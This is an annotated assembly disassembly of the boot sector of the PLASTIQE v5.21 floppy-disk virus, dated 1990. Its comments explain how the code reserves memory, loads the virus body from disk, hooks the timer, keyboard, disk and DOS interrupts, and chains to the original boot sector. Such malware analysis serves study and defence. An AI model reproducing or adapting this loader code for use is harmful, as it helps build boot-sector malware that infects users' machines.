;---------------------------------------------------------------------------
;     PLASTIQE v:5.21 Boot sector from floppy diskette
;
;                                      Disassembled by SI-IS, 1990.10.21.
;---------------------------------------------------------------------------

      Org 100

0100  E99C00         JMP    019F

0103                 DB     'IBM  3.3',00
010C                 DB     02,02,01,00
0110                 DB     02,70,00,D0,02,FD,02,00
0118                 DB     09 00           ;Sector / Trk
011A                 DB     02,00           ;Heads nr.
011C                 DB     00,00           ;Sector / Cluster
011E                 DB     00,00
0120                 DB     00,00,00,00,00,00,00,00
0128                 DB     'IO      SYS'
0133                 DB     'MSDOS   SYS'
013E                 DB     CB,3C
0140                 DB     FE,FF           ;
0142                 DB     FE,7F
0144                 DB     01,28           ; Start sector, Cylinder
0146                 DB     00,00           ; Drive, Head
0148                 DB     'Non-system disk or disk error.',0D,0A
                             Replace and strike any key when ready'
018D                 DB     'Disk boot failure.'

;---------------------------------------------------------------------------
019F  B8006E         MOV    AX,6E00         ;Convert Segments
01A2  B104           MOV    CL,04
01A4  D3E8           SHR    AX,CL           ;AX=06E0  (1760)
01A6  8CC9           MOV    CX,CS
01A8  03C1           ADD    AX,CX
01AA  8ED8           MOV    DS,AX
01AC  8EC0           MOV    ES,AX
01AE  8ED1           MOV    SS,CX
01B0  BCF0FF         MOV    SP,FFF0
01B3  1E             PUSH   DS
01B4  B8B90E         MOV    AX,0EB9         ;
01B7  50             PUSH   AX
01B8  CB             RET    Far             ;>> Goto 01B9

01B9  2E8816460E     MOV    CS:[0E46],DL    ;Save DrvNr from was loaded [0146]
01BE  33C0           XOR    AX,AX
01C0  8ED8           MOV    DS,AX           ;DS = 0
01C2  A11304         MOV    AX,[0413]       ;Memory Size in KByte
01C5  B106           MOV    CL,06
01C7  D3E0           SHL    AX,CL           ;convert to byte value
01C9  8ED8           MOV    DS,AX           ;DS = A000 ( if 640K )
01CB  833E400EFE     CMP    [0E40],FFFE     ;>> Here eqal
01D0  751A           JNZ    01EC
01D2  B8540F         MOV    AX,0F54         ;If allready exists in memory
01D5  1E             PUSH   DS
01D6  50             PUSH   AX
01D7  1E             PUSH   DS
01D8  07             POP    ES
01D9  BF000E         MOV    DI,0E00
01DC  33C0           XOR    AX,AX
01DE  8ED8           MOV    DS,AX
01E0  BE007C         MOV    SI,7C00
01E3  B94000         MOV    CX,0040
01E6  FA             CLI
01E7  FC             CLD
01E8  F3A4           REP    MOVSB           ;Move System file names
01EA  FB             STI
01EB  CB             RET    Far             ;>> Goto 0254

01EC  33C0           XOR    AX,AX           ;Dec memory size with 8 Kbyte
01EE  8ED8           MOV    DS,AX
01F0  A11304         MOV    AX,[0413]
01F3  2D0800         SUB    AX,0008
01F6  A31304         MOV    [0413],AX
01F9  B106           MOV    CL,06
01FB  D3E0           SHL    AX,CL
01FD  8ED8           MOV    DS,AX           ;DS = Our CodeSeg = 9E00
01FF  8EC0           MOV    ES,AX           ;ES = Our CodeSeg
0201  2E8B16460E     MOV    DX,CS:[0E46]    ;Drve & Head value
0206  BB0000         MOV    BX,0000         ;Buffer offs
0209  2E8B0E440E     MOV    CX,CS:[0E44]    ;Starting sector & Cylinder value
020E  B80802         MOV    AX,0208         ;Read, 8 sector
0211  E8CE00         CALL   02E2            ;Call disk functions
                                            ;LOAD VIRUS INTO MEMORY
0214  1E             PUSH   DS
0215  B81A0F         MOV    AX,0F1A
0218  50             PUSH   AX
0219  CB             RET    Far             ;>>Goto 021A

021A  2E8816460E     MOV    CS:[0E46],DL    ;Save DrvNr from was loaded [0146]
021F  33C0           XOR    AX,AX
0221  8ED8           MOV    DS,AX
0223  C7068400FFFF   MOV    [0084],FFFF     ;Set INT 21 Offset to FFFF
0229  0E             PUSH   CS
022A  07             POP    ES

022B  E8A6FB         CALL   FDD4            ;(? Call proc from virus code ?)

022E  BF2103         MOV    DI,0321         ;Save into 9E00:0321 (Timer)
0231  BE2000         MOV    SI,0020         ;INT 8 value, and set to
0234  8CC9           MOV    CX,CS           ;
0236  BA7C0F         MOV    DX,0F7C         ; CS:xx7C ( here 027C)
0239  E88B00         CALL   02C7            ;
023C  BE2400         MOV    SI,0024         ;Save into 9E00:0006 (Keyboard)
023F  BF0600         MOV    DI,0006         ;INT 9 value, and set to
0242  BAB103         MOV    DX,03B1         ; CS:03B1
0245  E87F00         CALL   02C7            ;
0248  BE4C00         MOV    SI,004C         ;Save into 9E00:000A (Disk IO)
024B  BF0A00         MOV    DI,000A         ;INT 13 value, and set to
024E  BA2605         MOV    DX,0526         ; CS:0526
0251  E87300         CALL   02C7

0254  2EC6067B0F00   MOV    CS:[0F7B],00    ;>> Here 027B
025A  90             NOP
025B  33C0           XOR    AX,AX           ;Read original Boot sector
025D  8EC0           MOV    ES,AX           ;
025F  8ED8           MOV    DS,AX           ;
0261  BB007C         MOV    BX,7C00         ;into 0:7C00
0264  2E8B0E440E     MOV    CX,CS:[0E44]    ;
0269  80C108         ADD    CL,08           ;
026C  2E8B16460E     MOV    DX,CS:[0E46]    ;
0271  B80102         MOV    AX,0201         ;
0274  E86B00         CALL   02E2            ;Call disk functions
0277  1E             PUSH   DS
0278  53             PUSH   BX
0279  CB             RET    Far             ;Execute orig Boot sector
;---------------------------------------------------------------------------
027A                 DB     00
027B                 DB     01              ;"Dos complet" flag in virus
;---------------------------------------------------------------------------
027C  FA             CLI                    ;New INT 8 handler (* TIMER *)
027D  2E803E7B0F00   CMP    CS:[0F7B],00
0283  7403           JZ     0288
0285  E964F3         JMP    F5EC
0288  1E             PUSH   DS
0289  06             PUSH   ES
028A  50             PUSH   AX
028B  53             PUSH   BX
028C  51             PUSH   CX
028D  52             PUSH   DX
028E  56             PUSH   SI
028F  57             PUSH   DI
0290  33C0           XOR    AX,AX
0292  8ED8           MOV    DS,AX
0294  A18400         MOV    AX,[0084]       ;INT 21 Value ?
0297  3DFFFF         CMP    AX,FFFF         ; = FFFF
029A  741E           JZ     02BA            ;No - Exit
029C  2E80067A0F02   ADD    CS:[0F7A],02    ;
02A2  7316           JNC    02BA
02A4  2EC6067B0F01   MOV    CS:[0F7B],01    ;Set "Dos complet" flag
02AA  0E             PUSH   CS
02AB  07             POP    ES
02AC  BE8400         MOV    SI,0084         ;Save into 06D0 (Dos functions)
02AF  BFD006         MOV    DI,06D0         ;INT 21 value, and set to
02B2  8CC9           MOV    CX,CS           ; CS:06D4
02B4  BAD406         MOV    DX,06D4         ;
02B7  E80D00         CALL   02C7
02BA  5F             POP    DI
02BB  5E             POP    SI
02BC  5A             POP    DX
02BD  59             POP    CX
02BE  5B             POP    BX
02BF  58             POP    AX
02C0  07             POP    ES
02C1  1F             POP    DS
02C2  2EFF2E2103     JMP    Far CS:[0321]
;---------------------------------------------------------------------------
02C7  1E             PUSH   DS              ; Save and Set int vectors
02C8  50             PUSH   AX
02C9  33C0           XOR    AX,AX
02CB  8ED8           MOV    DS,AX
02CD  58             POP    AX
02CE  51             PUSH   CX
02CF  FC             CLD
02D0  B90200         MOV    CX,0002
02D3  F3A5           REP    MOVSW
02D5  59             POP    CX
02D6  83EE04         SUB    SI,0004
02D9  FA             CLI
02DA  8914           MOV    [SI],DX
02DC  894C02         MOV    [SI+02],CX
02DF  FB             STI
02E0  1F             POP    DS
02E1  C3             RET
;---------------------------------------------------------------------------
02E2  56             PUSH   SI
02E3  8BF0           MOV    SI,AX
02E5  CD13           INT    13              ; Disk operation
02E7  7308           JNC    02F1            ; Ok
02E9  B400           MOV    AH,00           ; Error, reset disk
02EB  CD13           INT    13
02ED  8BC6           MOV    AX,SI
02EF  EBF4           JMP    02E5            ; Repeat
02F1  5E             POP    SI
02F2  C3             RET
;---------------------------------------------------------------------------
02F3                 DB     11 DUP(0)       ;Not Used area
02FE                 DB     55,AA           ;Boot Sector Signature

;     *** END ***

